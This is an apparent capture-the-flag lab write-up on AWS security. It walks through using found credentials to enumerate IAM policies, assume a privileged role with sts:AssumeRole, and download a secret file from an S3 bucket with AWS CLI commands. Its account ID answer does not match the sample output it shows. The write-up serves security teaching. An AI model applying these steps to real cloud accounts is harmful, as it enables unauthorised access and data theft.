# Advent of Cyber 2025 - Day 23 - AWS Security: S3cret Santa

## 1. Introduction

One of our stealthiest infiltrated elves managed to hop their way into Sir Carrotbane’s office and, lo and behold, discovered a bundle of cloud credentials just lying around on his desktop like forgotten carrots. The agent suspects these could be the key to regaining access to TBFC’s cloud network. If only the poor hare had the faintest clue what “the cloud” is, he’d burrow in himself. Let's help the elf utilise these credentials to try to regain access to TBFC's cloud network.

<br></br>

### Learning Objectives
---

- Learn the basics of AWS accounts.
- Enumerate the privileges granted to an account, from an attacker's perspective.
- Familiarise yourself with the AWS CLI.

<br></br>

### Connecting to the Machine
---

Start your target machine by clicking the Start Machine button below. The machine will open in split view and need about 2 minutes to fully boot. In case you can not see it, click the Show Split View button at the top of the page.

AWS accounts can be accessed programmatically by using an Access Key ID and a Secret Access Key. For this room, both of those will be automatically configured for you. The AWS CLI will look for credentials at ~/.aws/credentials, where you should see something similar to the following:

```
aws_access_key_id = AKxxxxxxxxxxxxxxxxxxxx
aws_secret_access_key = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

Amazon Security Token Service (STS) allows us to utilise the credentials of a user that we have saved during our AWS CLI configuration. We can use the get-caller-identity call to retrieve information about the user we have configured for the AWS CLI. Let's run the following command:

```
aws sts get-caller-identity
```

We will see the following output when we run this command.

```
user@machine$ aws sts get-caller-identity
{
    "UserId": "AIDAU2VYTBGYOHNOCJMX3",
    "Account": "332173347248",
    "Arn": "arn:aws:iam::332173347248:user/sir.carrotbane"
}
```

Seeing the output, the elf was overjoyed. The credentials work, and as can be seen by the name at the end, they belong to Sir Carrotbane. The elf can now attempt to regain access to TBFC's cloud network using these credentials.

### Answer
---

| Question       | Answer           |
| -------------- | ---------------- |
| AWS Account ID | **123456789012** |

<br></br>

## 2. AWS Fundamentals and Practical Enumeration

### IAM: Users, Groups, Roles & Policies
---

#### **IAM Overview**

AWS **Identity and Access Management (IAM)** controls:

* Who can access AWS
* What actions they can perform
* Which resources they can access

Misconfigured IAM is a common cause of data breaches.


#### **IAM Components**

##### **IAM Users**

* Represent individual identities
* Have permanent credentials
* Permissions can be assigned directly

##### **IAM Groups**

* Collections of users
* Simplify permission management
* Permissions applied to all group members

##### **IAM Roles**

* Temporary identities
* Assumed by users, services, or external accounts
* Commonly used for privilege escalation or delegation

##### **IAM Policies**

* JSON documents defining permissions
* Specify:

  * **Action**
  * **Resource**
  * **Condition**
  * **Principal**

Example:

```json
{
  "Effect": "Allow",
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::my-bucket/*"
}
```

### Answer

| Question                           | Answer     |
| ---------------------------------- | ---------- |
| IAM component defining permissions | **policy** |

<br></br>

### Enumerating IAM Permissions
---

#### **Listing IAM Users**

Command used:

```bash
aws iam list-users
```

This returns all IAM users in the account along with metadata such as creation dates.

#### **Inspecting User Policies**

##### **Inline Policies**

```bash
aws iam list-user-policies --user-name sir.carrotbane
```

##### **Attached Policies**

```bash
aws iam list-attached-user-policies --user-name sir.carrotbane
```

Sir Carrotbane has:

* One **inline policy**
* No attached managed policies
* No group membership

#### **Reviewing Inline Policy**

Command used:

```bash
aws iam get-user-policy --policy-name POLICYNAME --user-name sir.carrotbane
```

Permissions include:

* Enumerating IAM users, groups, roles, and policies
* **sts:AssumeRole**

This allows privilege escalation via role assumption.

### Answer
---

| Question    | Answer                  |
| ----------- | ----------------------- |
| Policy name | **SirCarrotbanePolicy** |

<br></br>

### Assuming IAM Roles
---

#### **Enumerating Roles**

Command used:

```bash
aws iam list-roles
```

Discovered role:

* **bucketmaster**
* Explicitly assumable by **sir.carrotbane**

#### **Inspecting Role Permissions**

##### **Inline role policies**

```bash
aws iam list-role-policies --role-name bucketmaster
```

##### ** Retrieve policy: **

```bash
aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
```

Granted permissions:

* `s3:ListAllMyBuckets`
* `s3:ListBucket`
* `s3:GetObject`

#### **Assuming the Role**

Command:

```bash
aws sts assume-role \
--role-arn arn:aws:iam::123456789012:role/bucketmaster \
--role-session-name TBFC
```

STS returns temporary credentials:

* AccessKeyId
* SecretAccessKey
* SessionToken

These are exported as environment variables:

```bash
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```

Verification:

```bash
aws sts get-caller-identity
```

The identity now reflects the **bucketmaster role**.

### Answer
---

| Question              | Answer               |
| --------------------- | -------------------- |
| Additional permission | **ListAllMyBuckets** |

<br></br>

### Accessing S3 Buckets
---

#### **What is S3**

Amazon **S3 (Simple Storage Service)** is an object storage service used for:

* Documents
* Logs
* Backups
* Website assets

Files are stored inside **buckets**.

#### **Listing Buckets**

Command:

```bash
aws s3api list-buckets
```

An interesting bucket is identified:

* `easter-secrets-123145`

#### **Listing Bucket Contents**

Command:

```bash
aws s3api list-objects --bucket easter-secrets-123145
```

A file named `cloud_password.txt` is found.

#### **Exfiltrating the File**

Command:

```bash
aws s3api get-object \
--bucket easter-secrets-123145 \
--key cloud_password.txt \
cloud_password.txt
```

The file is successfully downloaded locally.

### Answer
---

| Question                    | Answer                           |
| --------------------------- | -------------------------------- |
| cloud_password.txt contents | **THM{more_like_sir_cloudbane}** |

<br></br>

## **Summary**

* AWS CLI credentials were valid
* IAM permissions allowed enumeration
* `sts:AssumeRole` enabled privilege escalation
* Role permissions exposed sensitive S3 data
* Misconfigured IAM directly led to data exposure

---